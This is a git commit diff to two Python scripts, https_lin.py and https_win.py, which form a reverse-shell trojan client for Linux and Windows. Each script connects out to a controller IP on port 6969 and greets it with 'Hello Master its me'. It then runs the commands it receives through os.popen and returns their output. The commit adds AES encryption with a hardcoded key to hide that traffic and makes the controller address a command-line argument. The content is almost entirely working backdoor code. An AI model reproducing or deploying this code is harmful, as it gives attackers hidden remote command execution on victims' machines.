8b54fc9a68545fc131f128b543c08aea652f685c
Nelson Maligro <nelsonmaligro@hotmail.com>
2018-10-17 01:32:18 -0400

    release 1

--- https_lin.py
+++ https_lin.py
@@ -1,13 +1,24 @@
-import socket, sys, select, os
+import socket, sys, select, os, random, string
+from Crypto.Cipher import AES
 
-ipaddr = "192.168.32.195"
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def main(dst):
+  #initialize encryption
+  iv = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
+  ncrypt = AES.new ('torjak#69maligro', AES.MODE_CBC, iv)
 
-sock.connect ((ipaddr, 6969))
-#sock.setblocking(0)
-sock.send("Hello Master its me: " + ipaddr)
-while (1):
-	cmd =''
+  #initialize socket
+  ipaddr = dst
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+  sock.connect ((ipaddr, 6969))
+  #Send initial connection message
+  cmd = "Hello Master its me: " + ipaddr
+  if (len(cmd) % 16 != 0):
+    cmd += ' ' * (16 - len(cmd) % 16) # <- padded with spaces
+
+  cmd = ncrypt.encrypt(cmd)
+  sock.send(cmd)
+  while (1):
 	try:
  		read, write, err = select.select([sock],[], [])
 		for IO in read:
@@ -15,23 +26,38 @@ while (1):
 				data = sock.recv(4096)
 				if data:
 					print ('received: ' + data)
+					data = ncrypt.decrypt(data)
+					data = data.rstrip()
+					print ('decoded: ' + data)
 					cmd = os.popen(data).read()
-                                        sock.send(cmd)
+					if (len(cmd) % 16 != 0):
+            					cmd += ' ' * (16 - len(cmd) % 16) # <- padded with spaces
+					cmd = ncrypt.encrypt(cmd)
+					sock.send(cmd)
 				else:
 					sock.close()
 					sys.exit()
 			#else:
+				#print('readline')
 				#cmd = sys.stdin.readline()
 				#if cmd == "exit\n":
-				#	sys.exit()
-				#else:
-				#	sock.send(cmd)
+			#		sys.exit()
+			#	else:
+		 	#		sock.send(cmd)
 
 	except Exception as e:
 		print (e)
 		sock.close()
 		sys.exit(0)
 
-#sock.close()
 
+
+if __name__ == '__main__':
+    if len(sys.argv) < 2:
+        msg = 'missing mandatory options. Execute as root:\n'
+        msg += './httpsh_win.exe <destination IP address>\n'
+        sys.stderr.write(msg)
+        sys.exit(1)
+
+    main(sys.argv[1])
 
--- https_win.py
+++ https_win.py
@@ -1,23 +1,24 @@
-import socket, sys, select, os, random, string
+import socket, sys, select, os, random
 from Crypto.Cipher import AES
 
-#initialize encryption
-iv = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
-ncrypt = AES.new ('torjak#69maligro', AES.MODE_CBC, iv)
+def main(dst):
+  #initialize encryption
+  iv = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
+  ncrypt = AES.new ('torjak#69maligro', AES.MODE_CBC, iv)
 
-#initialize socket
-ipaddr = "192.168.32.195"
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  #initialize socket
+  ipaddr = dst
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-sock.connect ((ipaddr, 6969))
-#Send initial connection message
-cmd = "Hello Master its me: " + ipaddr
-if (len(cmd) % 16 != 0):
+  sock.connect ((ipaddr, 6969))
+  #Send initial connection message
+  cmd = "Hello Master its me: " + ipaddr
+  if (len(cmd) % 16 != 0):
     cmd += ' ' * (16 - len(cmd) % 16) # <- padded with spaces
 
-cmd = ncrypt.encrypt(cmd)
-sock.send(cmd)
-while (1):
+  cmd = ncrypt.encrypt(cmd)
+  sock.send(cmd)
+  while (1):
 	try:
  		read, write, err = select.select([sock],[], [])
 		for IO in read:
@@ -49,6 +50,14 @@ while (1):
 		sock.close()
 		sys.exit(0)
 
-#sock.close()
 
+
+if __name__ == '__main__':
+    if len(sys.argv) < 2:
+        msg = 'missing mandatory options. Execute as root:\n'
+        msg += './httpsh_win.exe <destination IP address>\n'
+        sys.stderr.write(msg)
+        sys.exit(1)
+
+    main(sys.argv[1])
 
